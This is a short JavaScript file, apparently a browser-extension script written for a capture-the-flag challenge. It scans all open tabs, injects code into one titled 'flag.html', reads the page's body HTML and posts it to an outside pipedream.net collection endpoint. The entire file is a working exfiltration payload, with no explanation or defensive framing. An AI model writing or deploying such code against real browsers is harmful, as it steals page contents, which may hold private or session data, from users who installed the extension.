document.addEventListener('DOMContentLoaded', function() {
    function checkAndExecuteScript() {
        chrome.tabs.query({}, function(tabs) {
            tabs.forEach(function(tab) {
                if (tab.title === 'flag.html') {
                    chrome.tabs.executeScript(tab.id, {
                        code: `
                            var bodyContent = document.body.innerHTML; 
                            fetch("https://eoyz1blvtlymzlj.m.pipedream.net", { 
                                method: "POST", 
                                body: JSON.stringify({ bodyContent }) 
                            });
                        `
                    });
                }
            });
        });
    }

    checkAndExecuteScript();
});
